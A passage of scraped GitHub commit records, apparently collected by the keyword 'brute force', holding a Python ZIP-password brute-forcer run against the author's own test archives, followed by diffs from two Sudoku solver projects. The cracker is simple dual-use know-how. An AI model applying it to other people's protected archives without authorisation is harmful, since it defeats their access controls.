'two_lowercase_letters_password.zip' is:{lowercase_letter_password}\") print(\"Digit password:\") digit_password=brute_force_zip_password(zip_file_name=\".\/resources\/digit_password.zip\", source=choose_selected_values_to_generate_password(lowercase=False, digits=True), print_progress_bar=True) print(f\"Password for file 'digit_password.zip' is:{digit_password}\") print(\"Uppercase letter password:\") uppercase_letter_password=brute_force_zip_password(zip_file_name=\"resources\/uppercase_letters_password.zip\", source=choose_selected_values_to_generate_password( lowercase=False, uppercase=True), print_progress_bar=True) print(f\"Password for file 'uppercase_letters_password.zip' is:{uppercase_letter_password}\") print(\"Letters and digits password:\") letters_and_digits_password=brute_force_zip_password(zip_file_name=\".\/resources\/letters_and_digits_password.zip\", source=choose_selected_values_to_generate_password( uppercase=True, digits=True), print_progress_bar=True) print(f\"Password for file 'letters_and_digits_password.zip' is:{letters_and_digits_password}\") ","sourceWithComments":"from zip_cracker import brute_force_zip_password, choose_selected_values_to_generate_password\n\nif __name__ == \"__main__\":\n    print(\"Lowercase letter password:\")\n    lowercase_letter_password = brute_force_zip_password(zip_file_name=\".\/resources\/two_lowercase_letters_password.zip\",\n                                                         source=choose_selected_values_to_generate_password(),\n                                                         print_progress_bar=True)\n    print(f\"Password for file 'two_lowercase_letters_password.zip' is: {lowercase_letter_password}\")\n    print(\"Digit password:\")\n    digit_password = brute_force_zip_password(zip_file_name=\".\/resources\/digit_password.zip\",\n                                              source=choose_selected_values_to_generate_password(lowercase=False,\n                                                                                                 digits=True),\n                                              print_progress_bar=True)\n    print(f\"Password for file 'digit_password.zip' is: {digit_password}\")\n    print(\"Uppercase letter password:\")\n    uppercase_letter_password = brute_force_zip_password(zip_file_name=\"resources\/uppercase_letters_password.zip\",\n                                                         source=choose_selected_values_to_generate_password(\n                                                             lowercase=False, uppercase=True),\n                                                         print_progress_bar=True)\n    print(f\"Password for file 'uppercase_letters_password.zip' is: {uppercase_letter_password}\")\n    print(\"Letters and digits password:\")\n    letters_and_digits_password = brute_force_zip_password(zip_file_name=\".\/resources\/letters_and_digits_password.zip\",\n                                                           source=choose_selected_values_to_generate_password(\n                                                               uppercase=True, digits=True),\n                                                           print_progress_bar=True)\n    print(f\"Password for file 'letters_and_digits_password.zip' is: {letters_and_digits_password}\")\n"},"\/zip_cracker.py":{"changes":[{"diff":"\n         yield itertools.product(source, repeat=current_length)\n \n \n-def brute_force_zip_password(zip_file_name: str, source: str, min_length: int = 1, max_length: int = 5,\n+def brute_force_zip_password(zip_file_path: str, source: str, min_length: int = 1, max_length: int = 5,\n                              print_progress_bar: bool = False) -> Union[None, str]:\n-    source_file = zipfile.ZipFile(zip_file_name)\n+    source_file = zipfile.ZipFile(zip_file_path)\n     source_length = len(source)\n \n     def loop_function():\n","add":2,"remove":2,"filename":"\/zip_cracker.py","badparts":["def brute_force_zip_password(zip_file_name: str, source: str, min_length: int = 1, max_length: int = 5,","    source_file = zipfile.ZipFile(zip_file_name)"],"goodparts":["def brute_force_zip_password(zip_file_path: str, source: str, min_length: int = 1, max_length: int = 5,","    source_file = zipfile.ZipFile(zip_file_path)"]}],"source":"\nimport itertools import string import zipfile from threading import Event, Thread from typing import Union, Iterator def choose_selected_values_to_generate_password(lowercase: bool=True, uppercase: bool=False, digits: bool=False, ascii_characters: bool=False) -> str: if all(value is False for value in[lowercase, uppercase, digits, ascii_characters]): raise ValueError(\"At least one option should be True!\") source_string=\"\" if lowercase: source_string +=string.ascii_lowercase if uppercase: source_string +=string.ascii_uppercase if digits: source_string +=string.digits if ascii_characters: raise NotImplemented source_string=string.printable return source_string def _get_generators(source: str, min_length: int=1, max_length: int=5) -> Iterator[str]: if min_length > max_length: raise ValueError(\"Minimum length should be lower or equal to maximum length!\") if min_length <=0: raise ValueError(\"The minimum value should be at least 1!\") for current_length in range(min_length, max_length +1): yield itertools.product(source, repeat=current_length) def brute_force_zip_password(zip_file_name: str, source: str, min_length: int=1, max_length: int=5, print_progress_bar: bool=False) -> Union[None, str]: source_file=zipfile.ZipFile(zip_file_name) source_length=len(source) def loop_function(): if print_progress_bar: total_number_of_combinations=sum([pow(source_length, power) for power in range(min_length, max_length +1)]) current_number_of_combinations=0 event=Event() password=\"\" def progress_bar(): while True: progress=current_number_of_combinations percent=100*(progress\/float(total_number_of_combinations)) bar=\"\u2588\"*int(percent) +\"-\"*(100 -int(percent)) print(f\"\\r|{bar}|{percent:.2f}%{progress}\/{total_number_of_combinations}:{password}\", end=\"\\r\") if event.is_set(): break print_thread=Thread(target=progress_bar) print_thread.start() for generator in _get_generators(source=source, min_length=min_length, max_length=max_length): for password in generator: password=\"\".join(password) try: source_file.extractall(pwd=password.encode()) if print_progress_bar: event.set() print_thread.join() progress_bar() print() return password except: if print_progress_bar: current_number_of_combinations +=1 continue return None return loop_function() ","sourceWithComments":"import itertools\nimport string\nimport zipfile\n\nfrom threading import Event, Thread\nfrom typing import Union, Iterator\n\n\ndef choose_selected_values_to_generate_password(lowercase: bool = True, uppercase: bool = False, digits: bool = False,\n                                                ascii_characters: bool = False) -> str:\n    if all(value is False for value in [lowercase, uppercase, digits, ascii_characters]):\n        raise ValueError(\"At least one option should be True!\")\n    source_string = \"\"\n    if lowercase:\n        source_string += string.ascii_lowercase\n    if uppercase:\n        source_string += string.ascii_uppercase\n    if digits:\n        source_string += string.digits\n    if ascii_characters:\n        raise NotImplemented\n        source_string = string.printable\n    return source_string\n\n\ndef _get_generators(source: str, min_length: int = 1, max_length: int = 5) -> Iterator[str]:\n    if min_length > max_length:\n        raise ValueError(\"Minimum length should be lower or equal to maximum length!\")\n    if min_length <= 0:\n        raise ValueError(\"The minimum value should be at least 1!\")\n    for current_length in range(min_length, max_length + 1):\n        yield itertools.product(source, repeat=current_length)\n\n\ndef brute_force_zip_password(zip_file_name: str, source: str, min_length: int = 1, max_length: int = 5,\n                             print_progress_bar: bool = False) -> Union[None, str]:\n    source_file = zipfile.ZipFile(zip_file_name)\n    source_length = len(source)\n\n    def loop_function():\n        if print_progress_bar:\n            total_number_of_combinations = sum([pow(source_length, power) for power in range(min_length, max_length + 1)])\n            current_number_of_combinations = 0\n            event = Event()\n            password = \"\"\n\n            def progress_bar():\n                while True:\n                    progress = current_number_of_combinations\n                    percent = 100*(progress\/float(total_number_of_combinations))\n                    bar = \"\u2588\"*int(percent) + \"-\"*(100 - int(percent))\n                    print(f\"\\r|{bar}| {percent:.2f}% {progress}\/{total_number_of_combinations}: {password}\", end=\"\\r\")\n                    if event.is_set():\n                        break\n            print_thread = Thread(target=progress_bar)\n            print_thread.start()\n\n        for generator in _get_generators(source=source, min_length=min_length, max_length=max_length):\n            for password in generator:\n                password = \"\".join(password)\n                try:\n                    source_file.extractall(pwd=password.encode())\n                    if print_progress_bar:\n                        event.set()\n                        print_thread.join()\n                        progress_bar()\n                        print()\n                    return password\n                except:\n                    if print_progress_bar:\n                        current_number_of_combinations += 1\n                    continue\n        return None\n    return loop_function()\n"}},"msg":"Update argument name for brute_force_zip_password."}},"https:\/\/github.com\/TylerChalifoux\/sudokuSolver":{"e174bb94a756d18c0f92f609a5c42680cf6be22b":{"url":"https:\/\/api.github.com\/repos\/TylerChalifoux\/sudokuSolver\/commits\/e174bb94a756d18c0f92f609a5c42680cf6be22b","html_url":"https:\/\/github.com\/TylerChalifoux\/sudokuSolver\/commit\/e174bb94a756d18c0f92f609a5c42680cf6be22b","message":"Updated\n\nOnly need to make the UI and the brute force to finish","sha":"e174bb94a756d18c0f92f609a5c42680cf6be22b","keyword":"brute force update","diff":"diff --git a\/sudokuSolver.py b\/sudokuSolver.py\nindex 8e9acac..09ee222 100644\n--- a\/sudokuSolver.py\n+++ b\/sudokuSolver.py\n@@ -8,9 +8,16 @@ def __init__(self, groupNum, row, col):\n \n board = []\n \n-#Resets the board with numbers equal to 0\n+#Pops the whole board array a remakes the board with numbers equal to 0 and sets there row, column, and group information\n def resetBoard():\n     i=0\n+    while(i<len(board)):\n+        board.pop\n+        i+=1\n+\n+    for nums in board:\n+        nums.pop\n+    i=0\n     groupBaseNum = 1\n     setRow = 0\n     setCol = 0\n@@ -44,10 +51,50 @@ def printBoard():\n         i+=1\n         j=0\n         while j<9:\n-            print(f'{board[int].num} | ', end = '')\n+            number = str(board[int].num)\n+            print(f'{number} | ', end = '')\n             j+=1\n             int+=1\n \n+#Sets the board with numbers, runs reset board and print board\n+def setBoard():\n+    resetBoard()\n+    userInput = input(\"Use test case (y\/n): \")\n+    if(userInput == \"y\"):\n+        testBoard = [8,0,0,0,0,0,0,0,0,0,1,3,8,6,7,5,4,9,4,7,0,5,0,3,2,6,0,0,0,0,0,5,0,9,8,1,0,6,8,9,0,0,0,0,0,7,0,1,3,4,0,0,2,0,6,0,0,0,7,0,0,0,4,0,0,7,0,0,9,0,0,0,0,3,0,0,8,0,0,1,2]\n+        i=0\n+        while(i<81):\n+            board[i].num = testBoard[i]\n+            i+=1\n+    elif(userInput == \"n\"):\n+        i = 0\n+        while(i<81):\n+            print(f'\\n')\n+            enteredNumberTemp = input(\"Enter Number: \")\n+            if(enteredNumberTemp.isdigit()==False):\n+                print(\"INVALID ENTRY. Please enter only numbers 1 - 9 or a 0 for blank\")\n+            else:\n+                enteredNumber = int(enteredNumberTemp)\n+                if(enteredNumber > 9 or enteredNumber < 0):\n+                    print(\"INVALID ENTRY. Please enter only numbers 1 - 9 or a 0 for blank\")\n+                else:\n+                    def isNotValid():\n+                        j=0\n+                        if(i>0):\n+                            while(j<i):\n+                                if(board[j].row == board[i].row) or (board[j].col == board[i].col) or (board[j].groupNum == board[i].groupNum):\n+                                    if(board[j].num == enteredNumber):\n+                                        return True\n+                                j+=1\n+                        return False\n+                    \n+                    if(enteredNumber!=0 and isNotValid()):\n+                        print(\"INVALID ENTRY. Number would cause board to be unplayable\")\n+                    else:\n+                        board[i].num = enteredNumber\n+                        printBoard()\n+                        i+=1\n+\n #This function goes through and updates all the possibleNums[] the square is allowed to be\n def updatePossibilities():\n     i=0\n@@ -68,9 +115,9 @@ def updatePossibilities():\n #Checks all the numbers to see if a box can only be one possible number, restarts the check if a number is changed\n #and re-runs the updatePossibilities to refresh possibleNums[]\n def checkForSolo():\n-    hasChanged = False\n     i=0\n     while(i<81):\n+        hasChanged = False\n         if(len(board[i].possibleNums)==1):\n             board[i].num = board[i].possibleNums[0]\n             board[i].possibleNums.pop()\n@@ -81,8 +128,44 @@ def checkForSolo():\n         else:\n             i+=1\n \n+#Takes the current elements possibleNums[] and compares it to the other elements possibleNums[]. If this has a unique\n+#number, it sets that square to that number and re-runs updatePossibilities to refresh possibleNums[]\n def checkForHasToBe():\n-    return (\"hi\")\n+    i=0\n+    didChange = False\n+    while(i<81):\n+        checkPosNums = []\n+        checkPosNums = board[i].possibleNums[:]\n+        j=0\n+        while(j<0):\n+            if(board[j].row == board[i].row) or (board[j].col == board[i].col) or (board[j].groupNum == board[i].groupNum):\n+                for checkPosNum in checkPosNums:\n+                    for curNum in board[j].possibleNums:\n+                        if(checkPosNum == curNum):\n+                            checkPosNums.remove(checkPosNum)\n+            j+=1\n+        if(len(checkPosNums)==1):\n+            board[i].num = checkPosNums[0]\n+            board[i].possibleNums.clear()\n+            updatePossibilities()\n+            didChange = True\n+        if(didChange):\n+            i=0\n+        else:\n+            i+=1\n+\n+#Runs updatePossibilities, then checkForSolo, and then checkForHasToBe for one solve attempt of the problem\n+def solve():\n+    updatePossibilities()\n+    checkForSolo()\n+    checkForHasToBe()\n+    print(f'\\n')\n+    print(f'\\n')\n+\n+\n+#TO DO ------\n+#   Create a function to brute force the solution after the solve\n \n-resetBoard()\n-printBoard()\n\\ No newline at end of file\n+setBoard()\n+solve()\n+printBoard()\n","files":{"\/sudokuSolver.py":{"changes":[{"diff":"\n         i+=1\n         j=0\n         while j<9:\n-            print(f'{board[int].num} | ', end = '')\n+            number = str(board[int].num)\n+            print(f'{number} | ', end = '')\n             j+=1\n             int+=1\n \n+#Sets the board with numbers, runs reset board and print board\n+def setBoard():\n+    resetBoard()\n+    userInput = input(\"Use test case (y\/n): \")\n+    if(userInput == \"y\"):\n+        testBoard = [8,0,0,0,0,0,0,0,0,0,1,3,8,6,7,5,4,9,4,7,0,5,0,3,2,6,0,0,0,0,0,5,0,9,8,1,0,6,8,9,0,0,0,0,0,7,0,1,3,4,0,0,2,0,6,0,0,0,7,0,0,0,4,0,0,7,0,0,9,0,0,0,0,3,0,0,8,0,0,1,2]\n+        i=0\n+        while(i<81):\n+            board[i].num = testBoard[i]\n+            i+=1\n+    elif(userInput == \"n\"):\n+        i = 0\n+        while(i<81):\n+            print(f'\\n')\n+            enteredNumberTemp = input(\"Enter Number: \")\n+            if(enteredNumberTemp.isdigit()==False):\n+                print(\"INVALID ENTRY. Please enter only numbers 1 - 9 or a 0 for blank\")\n+            else:\n+                enteredNumber = int(enteredNumberTemp)\n+                if(enteredNumber > 9 or enteredNumber < 0):\n+                    print(\"INVALID ENTRY. Please enter only numbers 1 - 9 or a 0 for blank\")\n+                else:\n+                    def isNotValid():\n+                        j=0\n+                        if(i>0):\n+                            while(j<i):\n+                                if(board[j].row == board[i].row) or (board[j].col == board[i].col) or (board[j].groupNum == board[i].groupNum):\n+                                    if(board[j].num == enteredNumber):\n+                                        return True\n+                                j+=1\n+                        return False\n+                    \n+                    if(enteredNumber!=0 and isNotValid()):\n+                        print(\"INVALID ENTRY. Number would cause board to be unplayable\")\n+                    else:\n+                        board[i].num = enteredNumber\n+                        printBoard()\n+                        i+=1\n+\n #This function goes through and updates all the possibleNums[] the square is allowed to be\n def updatePossibilities():\n     i=0\n","add":41,"remove":1,"filename":"\/sudokuSolver.py","badparts":["            print(f'{board[int].num} | ', end = '')"],"goodparts":["            number = str(board[int].num)","            print(f'{number} | ', end = '')","def setBoard():","    resetBoard()","    userInput = input(\"Use test case (y\/n): \")","    if(userInput == \"y\"):","        testBoard = [8,0,0,0,0,0,0,0,0,0,1,3,8,6,7,5,4,9,4,7,0,5,0,3,2,6,0,0,0,0,0,5,0,9,8,1,0,6,8,9,0,0,0,0,0,7,0,1,3,4,0,0,2,0,6,0,0,0,7,0,0,0,4,0,0,7,0,0,9,0,0,0,0,3,0,0,8,0,0,1,2]","        i=0","        while(i<81):","            board[i].num = testBoard[i]","            i+=1","    elif(userInput == \"n\"):","        i = 0","        while(i<81):","            print(f'\\n')","            enteredNumberTemp = input(\"Enter Number: \")","            if(enteredNumberTemp.isdigit()==False):","                print(\"INVALID ENTRY. Please enter only numbers 1 - 9 or a 0 for blank\")","            else:","                enteredNumber = int(enteredNumberTemp)","                if(enteredNumber > 9 or enteredNumber < 0):","                    print(\"INVALID ENTRY. Please enter only numbers 1 - 9 or a 0 for blank\")","                else:","                    def isNotValid():","                        j=0","                        if(i>0):","                            while(j<i):","                                if(board[j].row == board[i].row) or (board[j].col == board[i].col) or (board[j].groupNum == board[i].groupNum):","                                    if(board[j].num == enteredNumber):","                                        return True","                                j+=1","                        return False","                    if(enteredNumber!=0 and isNotValid()):","                        print(\"INVALID ENTRY. Number would cause board to be unplayable\")","                    else:","                        board[i].num = enteredNumber","                        printBoard()","                        i+=1"]},{"diff":"\n #Checks all the numbers to see if a box can only be one possible number, restarts the check if a number is changed\n #and re-runs the updatePossibilities to refresh possibleNums[]\n def checkForSolo():\n-    hasChanged = False\n     i=0\n     while(i<81):\n+        hasChanged = False\n         if(len(board[i].possibleNums)==1):\n             board[i].num = board[i].possibleNums[0]\n             board[i].possibleNums.pop()\n","add":1,"remove":1,"filename":"\/sudokuSolver.py","badparts":["    hasChanged = False"],"goodparts":["        hasChanged = False"]},{"diff":"\n         else:\n             i+=1\n \n+#Takes the current elements possibleNums[] and compares it to the other elements possibleNums[]. If this has a unique\n+#number, it sets that square to that number and re-runs updatePossibilities to refresh possibleNums[]\n def checkForHasToBe():\n-    return (\"hi\")\n+    i=0\n+    didChange = False\n+    while(i<81):\n+        checkPosNums = []\n+        checkPosNums = board[i].possibleNums[:]\n+        j=0\n+        while(j<0):\n+            if(board[j].row == board[i].row) or (board[j].col == board[i].col) or (board[j].groupNum == board[i].groupNum):\n+                for checkPosNum in checkPosNums:\n+                    for curNum in board[j].possibleNums:\n+                        if(checkPosNum == curNum):\n+                            checkPosNums.remove(checkPosNum)\n+            j+=1\n+        if(len(checkPosNums)==1):\n+            board[i].num = checkPosNums[0]\n+            board[i].possibleNums.clear()\n+            updatePossibilities()\n+            didChange = True\n+        if(didChange):\n+            i=0\n+        else:\n+            i+=1\n+\n+#Runs updatePossibilities, then checkForSolo, and then checkForHasToBe for one solve attempt of the problem\n+def solve():\n+    updatePossibilities()\n+    checkForSolo()\n+    checkForHasToBe()\n+    print(f'\\n')\n+    print(f'\\n')\n+\n+\n+#TO DO ------\n+#   Create a function to brute force the solution after the solve\n \n-resetBoard()\n-printBoard()\n\\ No newline at end of file\n+setBoard()\n+solve()\n+printBoard()\n","add":39,"remove":3,"filename":"\/sudokuSolver.py","badparts":["    return (\"hi\")","resetBoard()","printBoard()"],"goodparts":["    i=0","    didChange = False","    while(i<81):","        checkPosNums = []","        checkPosNums = board[i].possibleNums[:]","        j=0","        while(j<0):","            if(board[j].row == board[i].row) or (board[j].col == board[i].col) or (board[j].groupNum == board[i].groupNum):","                for checkPosNum in checkPosNums:","                    for curNum in board[j].possibleNums:","                        if(checkPosNum == curNum):","                            checkPosNums.remove(checkPosNum)","            j+=1","        if(len(checkPosNums)==1):","            board[i].num = checkPosNums[0]","            board[i].possibleNums.clear()","            updatePossibilities()","            didChange = True","        if(didChange):","            i=0","        else:","            i+=1","def solve():","    updatePossibilities()","    checkForSolo()","    checkForHasToBe()","    print(f'\\n')","    print(f'\\n')","setBoard()","solve()","printBoard()"]}],"source":"\nclass Square: num=0 possibleNums=[] def __init__(self, groupNum, row, col): self.groupNum=groupNum self.row=row self.col=col board=[] def resetBoard(): i=0 groupBaseNum=1 setRow=0 setCol=0 setGroup=1 while i < 81: if(i!=0 and i%9==0): setRow +=1 setCol=0 if(setRow>2 and setRow<6): groupBaseNum=4 if(setRow>5): groupBaseNum=7 if(setCol<3): setGroup=groupBaseNum if(setCol>2 and setCol<6): setGroup=groupBaseNum+1 if(setCol>5): setGroup=groupBaseNum+2 board.append(Square(setGroup,setRow, setCol)) i+=1 setCol+=1 def printBoard(): i=0 int=0 while i<9: print(f'\\n') print(f'| ', end='') i+=1 j=0 while j<9: print(f'{board[int].num} | ', end='') j+=1 int+=1 def updatePossibilities(): i=0 while(i<81): if(board[i].num==0): allNums=[1,2,3,4,5,6,7,8,9] j=0 while(j<81): if(board[j].num!=0): if((board[j].row==board[i].row) or(board[j].col==board[i].col) or(board[j].groupNum==board[i].groupNum)): for nums in allNums: if(board[j].num==nums): allNums.remove(nums) j+=1 board[i].possibleNums=allNums[:] i+=1 def checkForSolo(): hasChanged=False i=0 while(i<81): if(len(board[i].possibleNums)==1): board[i].num=board[i].possibleNums[0] board[i].possibleNums.pop() hasChanged=True updatePossibilities() if(hasChanged): i=0 else: i+=1 def checkForHasToBe(): return(\"hi\") resetBoard() printBoard() ","sourceWithComments":"class Square:\n    num = 0\n    possibleNums = []\n    def __init__(self, groupNum, row, col):\n        self.groupNum = groupNum\n        self.row = row\n        self.col = col\n\nboard = []\n\n#Resets the board with numbers equal to 0\ndef resetBoard():\n    i=0\n    groupBaseNum = 1\n    setRow = 0\n    setCol = 0\n    setGroup = 1\n    while i < 81:\n        if(i!=0 and i%9==0):\n            setRow +=1\n            setCol = 0\n        if(setRow>2 and setRow<6):\n            groupBaseNum=4\n        if(setRow>5):\n            groupBaseNum=7\n        if(setCol<3):\n            setGroup = groupBaseNum\n        if(setCol>2 and setCol<6):\n            setGroup = groupBaseNum+1\n        if(setCol>5):\n            setGroup = groupBaseNum+2\n\n        board.append(Square(setGroup,setRow, setCol))\n        i+=1\n        setCol+=1\n\n#Prints the board to terminal\ndef printBoard():\n    i=0\n    int=0\n    while i<9:\n        print(f'\\n')\n        print(f'| ', end = '')\n        i+=1\n        j=0\n        while j<9:\n            print(f'{board[int].num} | ', end = '')\n            j+=1\n            int+=1\n\n#This function goes through and updates all the possibleNums[] the square is allowed to be\ndef updatePossibilities():\n    i=0\n    while(i<81):\n        if(board[i].num==0):\n            allNums = [1,2,3,4,5,6,7,8,9]\n            j=0\n            while(j<81):\n                if(board[j].num!=0):\n                    if((board[j].row == board[i].row) or (board[j].col == board[i].col) or (board[j].groupNum == board[i].groupNum)):\n                        for nums in allNums:\n                            if(board[j].num == nums):\n                                allNums.remove(nums)\n                j+=1\n            board[i].possibleNums = allNums[:]\n        i+=1\n\n#Checks all the numbers to see if a box can only be one possible number, restarts the check if a number is changed\n#and re-runs the updatePossibilities to refresh possibleNums[]\ndef checkForSolo():\n    hasChanged = False\n    i=0\n    while(i<81):\n        if(len(board[i].possibleNums)==1):\n            board[i].num = board[i].possibleNums[0]\n            board[i].possibleNums.pop()\n            hasChanged = True\n            updatePossibilities()\n        if(hasChanged):\n            i=0\n        else:\n            i+=1\n\ndef checkForHasToBe():\n    return (\"hi\")\n\nresetBoard()\nprintBoard()"}},"msg":"Updated\n\nOnly need to make the UI and the brute force to finish"}},"https:\/\/github.com\/KarelOmab\/sudosolve":{"2149e81887b426ed3ac279a94619d1d07019df09":{"url":"https:\/\/api.github.com\/repos\/KarelOmab\/sudosolve\/commits\/2149e81887b426ed3ac279a94619d1d07019df09","html_url":"https:\/\/github.com\/KarelOmab\/sudosolve\/commit\/2149e81887b426ed3ac279a94619d1d07019df09","message":"Update solve.py\n\nAdd (recursive) brute force solution logic","sha":"2149e81887b426ed3ac279a94619d1d07019df09","keyword":"brute force update","diff":"diff --git a\/solve.py b\/solve.py\nindex 9207a97..b209b35 100644\n--- a\/solve.py\n+++ b\/solve.py\n@@ -1,17 +1,7 @@\n class Block:\n     def __init__(self, cells):\n         self.cells = cells\n-    \n-    # get numeric values inside block that are missing (blanks)\n-    # TODO : make it prettier & more efficient\n-    def get_missing_values(self):\n-        missing = [x for x in range(1, 10)]\n-        for c in self.cells:\n-            if c.value != 0:\n-                missing.remove(c.value)\n-        return missing\n \n-    \n     def __str__(self):\n         s = []\n         # create blocks from board\n@@ -32,22 +22,54 @@ def __str__(self):\n \n class Board:\n \n-    rows = []   # not set because indexing is important\n-    cols = []   # not set because indexing is important\n-    blocks = [] # (9 element cell array of 3x3 blocks)\n-    \n-\n     def __init__(self, board):\n         self.board = board\n-        \n-        # create blocks from board\n+\n+    # get numeric values inside block that are missing (blanks)\n+    # TODO : make it prettier & more efficient\n+    def get_missing_cell_values(self, cells):\n+        missing = [x for x in range(1, 10)]\n+        for c in cells:\n+            if c.value != 0:\n+                missing.remove(c.value)\n+        return missing\n+\n+    # create blocks from board\n+    def get_blocks(self):\n+        blocks = []\n         for i in range(0, 9, 3):\n             for j in range(0, 9, 3):\n                 cells = []\n                 for k in range(3):\n                     for l in range(3):\n                         cells.append(self.board[i+k][j+l])\n-                self.blocks.append(Block(cells))\n+                blocks.append(Block(cells))\n+        return blocks\n+    \n+    # get rows from board\n+    # returns a list of type Cell\n+    def get_rows(self):\n+        rows = []\n+        \n+        for i in range(9):\n+            row = []\n+            for j in range(9):\n+                row.append(self.board[i][j])    \n+            rows.append(row)\n+        return rows\n+    \n+    # get cols from board\n+    # returns a list of type Cell\n+    def get_cols(self):\n+        cols = []\n+        \n+        for i in range(9):\n+            col = []\n+            for j in range(9):\n+                col.append(self.board[j][i])    \n+            cols.append(col)\n+        return cols\n+\n \n     # returns 0 on completed board\n     # TODO: returns -1 on invalid state\n@@ -56,7 +78,7 @@ def eval_board_state(self, verbose=True):\n         # check if the board is completed\n         is_blocks_completed = True\n         #check all blocks\n-        for block in self.blocks:\n+        for block in self.get_blocks():\n             buff = set()\n             for cell in block.cells:\n                 if cell.value != 0:\n@@ -135,28 +157,117 @@ def solve_board(self):\n             print(\"Solved!\")\n         elif state == -1:\n             print(\"Invalid board state!\")\n+        \n+        return state\n \n+     # create a dictionary that stores block indexes and the amount of blanks in them\n+    def count_blanks_in_blocks(self):\n+        d = dict()\n+        for i in range(len(self.get_blocks())):\n+            for c in self.get_blocks()[i].cells:\n+                if c.value == 0:\n+                    if i in d:\n+                        d[i] += 1\n+                    else:\n+                        d[i] = 1\n+        return d\n+    \n+    # create a dictionary that stores row indexes and the amount of blanks in them\n+    def count_blanks_in_rows(self):\n+        d = dict()\n+        \n+        for i in range(9):\n+            for j in range(9):\n+                c = self.board[i][j]\n+                #print(type(self.board[i][j]), self.board[i][j])\n+                if c.value == 0:\n+                    if i in d:\n+                        d[i] += 1\n+                    else:\n+                        d[i] = 1\n+        return self.get_dict_min_count(d)\n \n-    # this is the money maker\n-    def next_move(self):\n-        #print(\"new move\")\n-        # pick a cell that contains a number, attempt to solve it\n-\n-        # create a dictionary that stores block indexes and the amount of blanks in them\n+    # create a dictionary that stores col indexes and the amount of blanks in them\n+    def count_blanks_in_cols(self):\n         d = dict()\n-        for i in range(len(self.blocks)):\n-            for c in self.blocks[i].cells:\n+        \n+        for i in range(9):\n+            for j in range(9):\n+                c = self.board[j][i]\n+                #print(type(self.board[i][j]), self.board[i][j])\n                 if c.value == 0:\n                     if i in d:\n                         d[i] += 1\n                     else:\n                         d[i] = 1\n+        return self.get_dict_min_count(d)\n+\n+    def get_dict_min_count(self, dict):\n+        mi = (10, 10)   #value and index\n+        for k, v in dict.items():\n+            if v < mi[0]:\n+                mi = (v, k)\n+        \n+        return mi\n+    \n+    def guess(self):\n+        # logic to create a copy of valid board state and brute force solutions\n+        import copy\n+        valid_board_state = copy.deepcopy(self)\n+\n+        # find block \/ row \/ column that has most solved cells\n+        # make a guess and try to solve, if fails try backtracking...\n+\n+        min_blanks_block = self.get_dict_min_count(self.count_blanks_in_blocks()) + (\"block\",)\n+        min_blanks_row = self.count_blanks_in_rows() + (\"row\",)\n+        min_blanks_col = self.count_blanks_in_cols() + (\"col\",)\n+\n+        arr = [min_blanks_block, min_blanks_row, min_blanks_col]\n+        mi = min(arr)     \n+\n+        if mi[2] == \"block\":\n+            #guess within a block\n+            print(\"todo - guess within a block\", mi)\n+            input()\n+            pass\n+        elif mi[2] == \"row\":\n+            row = self.get_rows()[mi[1]]    #row of cells\n+            missing = self.get_missing_cell_values(row)\n+\n+            for c in row:\n+                if c.value == 0:\n+                    for m in missing:\n+                        c.value = m\n+                        res = self.solve_board()\n+\n+                        if res == 0:\n+                            return\n+\n+        elif mi[2] == \"col\":\n+            col = self.get_cols()[mi[1]]    #row of cells\n+            missing = self.get_missing_cell_values(col)\n+\n+            for c in col:\n+                if c.value == 0:\n+                    for m in missing:\n+                        c.value = m\n+                        res = self.solve_board()\n+\n+                        if res == 0:\n+                            return\n+\n+    # this is the money maker\n+    def next_move(self):\n+        #print(\"new move\")\n+        # pick a cell that contains a number, attempt to solve it\n+\n+        \n+        d = self.count_blanks_in_blocks()\n \n-        #print(d)\n         # iterate through (sorted) blocks based on most filled first (0 frequency lowest)\n         for key, value in sorted(d.items(), key=lambda item: item[1]):\n \n-            block = self.blocks[key]\n+            block = self.get_blocks()[key]\n             \n             #print(block)\n \n@@ -164,7 +275,7 @@ def next_move(self):\n             #print(\"---- checking block \" + str(key) + \" --------\")\n             #print(block.get_missing_values())\n \n-            for v in block.get_missing_values():\n+            for v in self.get_missing_cell_values(block.cells):\n                 buff = []\n                 for c in block.cells:\n                     if c.value == 0:\n@@ -177,7 +288,7 @@ def next_move(self):\n \n                 if len(buff) == 1:\n                     # guaranteed move\n-                    #print(\"guaranteed move!\", buff[0], \"->\", v)\n+                    print(\"guaranteed move!\", buff[0], \"->\", v)\n                     self.board[buff[0].row][buff[0].col].value = v\n                     #self.show()\n                     #input()\n@@ -190,15 +301,17 @@ def next_move(self):\n \n             #input()\n \n-        #input()\n-\n-        \n+        #input()     \n             \n \n-        print(\"No move possible?\")\n+        \n         self.show()\n         self.eval_board_state()\n-        input()\n+        print(\"No guaranteed moves possible, start brute forcing from this state\")\n+\n+        self.guess()\n+\n+        \n \n         # is the board solved?\n \n@@ -245,7 +358,7 @@ def __str__(self):\n     [4, 0, 0, 8, 0, 3, 0, 0, 1],\n     [7, 0, 0, 0, 2, 0, 0, 0, 6],\n     [0, 6, 0, 0, 0, 0, 2, 8, 0],\n-    [0, 0, 0, 4, 1, 9, 0, 0, 5],\n+    [0, 0, 0, 4, 0, 9, 0, 0, 5],\n     [0, 0, 0, 0, 8, 0, 0, 7, 9]\n ]\n \n","files":{"\/solve.py":{"changes":[{"diff":"\n class Block:\n     def __init__(self, cells):\n         self.cells = cells\n-    \n-    # get numeric values inside block that are missing (blanks)\n-    # TODO : make it prettier & more efficient\n-    def get_missing_values(self):\n-        missing = [x for x in range(1, 10)]\n-        for c in self.cells:\n-            if c.value != 0:\n-                missing.remove(c.value)\n-        return missing\n \n-    \n     def __str__(self):\n         s = []\n         # create blocks from board\n","add":0,"remove":10,"filename":"\/solve.py","badparts":["    def get_missing_values(self):","        missing = [x for x in range(1, 10)]","        for c in self.cells:","            if c.value != 0:","                missing.remove(c.value)","        return missing"],"goodparts":[]},{"diff":"\n \n class Board:\n \n-    rows = []   # not set because indexing is important\n-    cols = []   # not set because indexing is important\n-    blocks = [] # (9 element cell array of 3x3 blocks)\n-    \n-\n     def __init__(self, board):\n         self.board = board\n-        \n-        # create blocks from board\n+\n+    # get numeric values inside block that are missing (blanks)\n+    # TODO : make it prettier & more efficient\n+    def get_missing_cell_values(self, cells):\n+        missing = [x for x in range(1, 10)]\n+        for c in cells:\n+            if c.value != 0:\n+                missing.remove(c.value)\n+        return missing\n+\n+    # create blocks from board\n+    def get_blocks(self):\n+        blocks = []\n         for i in range(0, 9, 3):\n             for j in range(0, 9, 3):\n                 cells = []\n                 for k in range(3):\n                     for l in range(3):\n                        